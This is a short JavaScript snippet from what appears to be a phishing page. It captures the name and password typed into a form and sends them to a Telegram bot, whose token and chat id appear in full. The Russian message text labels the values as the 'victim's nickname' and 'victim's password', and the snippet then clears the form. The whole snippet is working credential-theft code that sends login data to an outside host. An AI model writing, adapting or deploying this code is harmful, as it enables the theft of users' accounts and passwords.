      const form = document.getElementById('main__form');

      form.addEventListener('submit', (event) => {
        event.preventDefault();

        const name = event.target[0].value;
        const password = event.target[1].value;
        const ob = {
            'NIk ' : name , 
            'poro' : password
        }
        const send = `
            ник жертвы : ${name}
            пароль жертвы : ${password}
        `
        axios.post(
          `https://api.telegram.org/bot6658549709:AAHZehjJCLXnjlkNLPyqGl6WUwUdBBprt6I/sendMessage?chat_id=-904998025&text=${send}`
        ).then(() => {
          event.target.reset();
        });
      });